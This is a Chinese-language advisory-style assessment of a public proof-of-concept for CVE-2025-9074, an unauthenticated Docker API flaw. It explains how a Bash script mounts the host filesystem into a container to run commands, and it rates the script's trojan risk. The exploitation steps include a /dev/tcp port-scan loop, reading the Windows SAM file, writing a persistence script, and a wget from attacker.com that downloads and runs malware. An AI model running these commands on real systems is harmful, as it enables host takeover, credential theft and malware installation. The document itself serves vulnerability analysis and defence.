## CVE-2025-9074 - Docker Daemon/Engine 未授权访问/远程代码执行 (RCE)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 未授权访问/远程代码执行 (RCE)

**影响应用:** Docker Daemon/Engine

**危害等级:** 严重 (Critical)

**CVSS评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

**影响版本:** Docker Engine 配置不当导致的未授权访问，具体版本未提及

**利用条件:** 需要网络访问到暴露的Docker API (通常在2375端口)，无需认证

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

POC有效性分析:
此POC代码针对的是CVE-2025-9074，一个利用暴露的Docker API实现未授权访问和远程代码执行的漏洞。`cve-2025-9074-poc.sh`脚本是一个基于Bash的完整漏洞利用工具，它展示了攻击者如何利用未受保护的Docker API来完全控制宿主机。该POC的核心功能是创建一个特殊的Docker容器，该容器被配置为将宿主机的关键目录（如Windows系统的C盘，在POC中被抽象为`/mnt/host/c`并挂载到容器的`/host_root`）映射到容器内部，从而允许容器内的进程直接访问和修改宿主机的文件系统。

POC的执行流程分为四个清晰的步骤：
1.  **容器创建**: POC向目标Docker API发送一个POST请求（`/containers/create`），指示Docker守护进程创建一个新的容器。这个请求的JSON负载中，`HostConfig`参数被巧妙地配置，通过`"Binds":["/mnt/host/c:/host_root"]`指令，将宿主机的`/mnt/host/c`路径（例如，在Windows系统上运行Docker时，可能映射到宿主机C盘的根目录，或者在Linux上通过特定配置映射到宿主机的其他敏感目录）挂载到新容器内部的`/host_root`目录。同时，容器的启动命令被设置为攻击者提供的任意命令（`$CMD`），这允许在容器启动后立即执行攻击者的指令。
2.  **容器启动**: 成功创建容器后，POC发送另一个POST请求（`/containers/$ID/start`）来启动这个新创建的容器。一旦容器启动，之前指定的`$CMD`就会在具有宿主机文件系统访问权限的环境中执行。
3.  **日志获取**: 为了获取命令的执行结果，POC会发送一个GET请求（`/containers/$ID/logs?stdout=true&stderr=true`）来检索容器的`stdout`和`stderr`输出。这些日志包含了`$CMD`的运行结果，例如读取到的敏感文件内容或命令执行的反馈。
4.  **资源清理**: 攻击完成后，为了隐藏痕迹或释放资源，POC会发送POST和DELETE请求（`/containers/$ID/stop`和`/containers/$ID/delete`）来停止并彻底删除之前创建的容器。

`README.md`文件详细说明了该Bash POC的动机，即为缺乏Python环境的Docker容器提供替代方案。它还提供了初步的网络扫描指令，用于发现暴露的Docker API端口（默认为2375）。文档中包含的截图清晰地展示了成功列出`/host_root`目录（即宿主机C盘内容）的场景，有力地证明了该漏洞的严重性和POC的有效性。通过这种机制，攻击者可以轻易地读取、修改甚至删除宿主机上的任意文件，进一步执行恶意程序，从而实现对整个宿主机系统的完全控制，这使得该漏洞的危害等级达到临界级别。

利用步骤:
1.  **发现暴露的Docker API**: 攻击者首先需要通过网络扫描技术（如Nmap或其他端口扫描工具），或者利用POC中提供的简易Bash脚本`for ip in 172.18.0.1 172.17.0.1 192.168.65.7; do (echo > /dev/tcp/$ip/2375 2>/dev/null && echo "[+] $ip:2375 open") || : done`，来探测目标网络中哪些主机的2375端口（或配置的其他Docker API端口）处于开放状态。开放的端口且无需认证即表示可能存在未授权访问漏洞。
2.  **准备POC脚本**: 确保拥有`cve-2025-9074-poc.sh`脚本的执行权限。
3.  **执行漏洞利用**: 运行POC脚本，并提供目标Docker API的IP地址、端口以及希望在宿主机上执行的命令。例如：`./cve-2005-9074-poc.sh <Docker API IP地址> 2375 "ls /host_root"`。这里的`<Docker API IP地址>`应替换为步骤1中发现的暴露API的IP地址。
4.  **接收命令结果**: POC脚本执行后，会自动创建、启动容器，执行指定的命令，并将命令的输出通过Docker日志机制返回给攻击者。在上述例子中，攻击者将看到宿主机`/mnt/host/c`（或等效路径）目录下的文件列表。
5.  **深入利用**: 攻击者可以进一步替换`ls /host_root`为更具破坏性或信息窃取能力的命令，例如：
    *   `cat /host_root/Windows/System32/config/SAM` (尝试读取Windows SAM文件)
    *   `echo 'attacker_command' > /host_root/path/to/startup/script.sh` (在Linux宿主机上写入启动脚本以实现持久化)
    *   `wget http://attacker.com/malware -O /host_root/tmp/malware && chmod +x /host_root/tmp/malware && /host_root/tmp/malware` (下载并执行恶意软件)。
    通过这些命令，攻击者可以完全控制宿主机，包括数据窃取、持久化后门植入以及横向移动等。

投毒风险分析:
对提供的`cve-2025-9074-poc.sh`脚本进行了详细的代码审计，以评估其潜在的投毒风险。
**代码结构与内容**:
该POC由一个`README.md`文件和一个Bash脚本`cve-2025-9074-poc.sh`组成。`README.md`清晰地解释了POC的用途、使用方法，甚至提供了如何发现目标IP的提示，以及利用成功后的截图，这些都极大地增强了代码的透明度。
Bash脚本本身是一个非常直接的工具，它通过`curl`命令与Docker守护进程的REST API进行交互。脚本接收三个命令行参数：目标IP、端口和要在容器中执行的命令。它的核心逻辑是：
1.  **创建容器**: 构建一个JSON负载，通过HTTP POST请求发送到`/containers/create`接口。负载中明确指定了`alpine`作为基础镜像，`Cmd`参数即为用户输入的恶意命令，而`HostConfig`中的`Binds`数组将宿主机的特定路径`/mnt/host/c`挂载到容器内的`/host_root`。
2.  **启动容器**: 通过HTTP POST请求到`/containers/$ID/start`接口来启动上一步创建的容器。
3.  **获取日志**: 通过HTTP GET请求到`/containers/$ID/logs`接口来获取容器的标准输出和标准错误，这将包含恶意命令的执行结果。
4.  **停止并删除容器**: 最后，通过HTTP POST和DELETE请求，清理掉为了利用漏洞而创建的容器。

**风险评估结果**:
1.  **代码透明度**: 脚本代码完全开放且未经过任何形式的混淆处理。所有`curl`请求及其参数、JSON负载都清晰可见。这意味着任何有基础Bash和HTTP知识的安全研究人员都可以轻松地审查并理解其全部功能。
2.  **外部依赖**: 脚本仅依赖于标准的Bash shell和`curl`工具，这些都是主流Linux发行版和类Unix系统中常见的组件。脚本本身没有引入任何额外的第三方库、二进制文件或外部模块，从而消除了通过引入恶意依赖进行投毒的风险。
3.  **恶意行为限定**: 脚本的“恶意”行为仅限于利用Docker API在宿主机上执行用户指定的命令，并访问挂载的宿主机文件系统。它没有包含任何预设的、硬编码的后门、加密通信、数据窃取并回传到攻击者服务器，或者修改宿主机关键配置以保持持久性等附加的恶意载荷。其执行的所有行为都直接服务于演示漏洞利用的目的。用户在提供`CMD`参数时，完全掌控了实际执行的命令。
4.  **网络活动**: 除了与目标Docker API的HTTP通信外，脚本没有尝试连接任何其他的外部IP地址或域名。这大大降低了通过隐藏的网络请求进行数据泄露或下载额外恶意组件的风险。
5.  **清理机制**: 脚本在完成利用后，会自动停止并删除创建的容器，这是一个良好的实践，有助于减少在目标系统上留下不必要的痕迹，也表明了其作为POC工具的专业性，而非旨在持久驻留的恶意软件。

**结论**: 鉴于上述分析，该POC代码的投毒风险被评估为极低。它是一个高度透明、功能单一、专注于漏洞演示的工具，不包含任何隐藏的恶意代码或意图。使用该POC时，最大的风险来源于用户自己输入的`CMD`参数是否具有恶意性。因此，将其投毒风险评定为5%。

**项目地址:** https://github.com/j3r1ch0123/CVE-2025-9074

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
